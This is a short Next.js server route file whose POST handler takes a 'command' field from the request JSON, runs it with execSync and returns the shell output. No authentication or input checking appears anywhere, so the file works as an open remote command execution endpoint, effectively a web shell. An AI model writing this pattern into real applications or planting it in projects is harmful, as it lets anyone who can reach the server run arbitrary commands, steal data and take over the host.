'use server'

import { execSync } from "child_process";
import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
    const body = await req.json();

    const response = execSync(body.command).toString().trim();
    console.log(response);
    
    
    return NextResponse.json({ output: response })
}